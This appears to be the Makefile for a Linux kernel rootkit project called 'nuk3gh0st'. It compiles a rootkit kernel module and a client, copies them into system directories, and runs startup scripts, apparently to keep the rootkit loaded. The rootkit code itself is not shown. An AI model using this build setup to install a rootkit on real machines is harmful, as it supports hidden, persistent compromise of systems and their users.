.PHONY: all
obj-m := rootkit.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
all: rootkit client
rootkit:
	$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD)
client:
	gcc -o nuk3gh0st nuk3gh0st.c --std=gnu99 -Wall -Wextra -pedantic
install:
	cp nuk3gh0st /usr/bin/nuk3gh0st
	cp rootkit.ko /usr/lib/rootkit.ko
	cp load-nuk3gh0st /usr/bin/load-nuk3gh0st
	cp unload-nuk3gh0st /usr/bin/unload-nuk3gh0st
	chmod +x /usr/bin/load-nuk3gh0st
	chmod +x /usr/bin/unload-nuk3gh0st
uninstall:
	rm /usr/bin/nuk3gh0st
	rm /usr/lib/rootkit.ko
startup:
	chmod +x startup.sh
	./startup.sh
clean-startup:
	chmod +x clean-startup.sh
	./clean-startup.sh
clean:
	rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
